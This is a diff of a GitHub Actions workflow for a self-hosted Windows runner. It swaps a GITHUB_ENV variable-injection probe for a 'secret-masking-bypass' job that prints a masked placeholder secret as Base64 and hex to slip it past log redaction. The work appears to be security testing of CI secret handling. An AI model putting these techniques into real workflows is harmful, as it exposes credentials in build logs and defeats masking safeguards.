@@ -1,23 +1,33 @@
-name: github-env-injection
+name: secret-masking-bypass
 on: workflow_dispatch
 jobs:
   test:
     runs-on: [self-hosted, Windows, X64]
     steps:
-      - name: Inject via GITHUB_ENV
+      - name: Create Test Secret
         shell: cmd
         run: |
-          echo Testing GITHUB_ENV injection...
-          echo NORMAL_VAR=test123 >> %GITHUB_ENV%
-          echo.
-          echo Attempting multiline injection:
-          echo EVIL_VAR=innocent >> %GITHUB_ENV%
-          echo INJECTED_SECRET=LEAKED_PASSWORD >> %GITHUB_ENV%
+          echo SUPER_SECRET_PASSWORD_12345 > secret.txt
           
-      - name: Check if Injection Worked
+      - name: Set as Secret in ENV
         shell: cmd
         run: |
-          echo Checking environment variables...
-          echo NORMAL_VAR=%NORMAL_VAR%
-          echo EVIL_VAR=%EVIL_VAR%
-          echo INJECTED_SECRET=%INJECTED_SECRET%
+          echo MY_SECRET=SUPER_SECRET_PASSWORD_12345 >> %GITHUB_ENV%
+          echo ::add-mask::SUPER_SECRET_PASSWORD_12345
+          
+      - name: Attempt Bypass - Base64
+        shell: powershell
+        env:
+          SECRET: SUPER_SECRET_PASSWORD_12345
+        run: |
+          $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:SECRET)
+          $base64 = [System.Convert]::ToBase64String($bytes)
+          Write-Host "Base64: $base64"
+          
+      - name: Attempt Bypass - Hex
+        shell: powershell
+        env:
+          SECRET: SUPER_SECRET_PASSWORD_12345
+        run: |
+          $hex = -join ($env:SECRET.ToCharArray() | ForEach-Object { '{0:X2}' -f [int]$_ })
+          Write-Host "Hex: $hex"
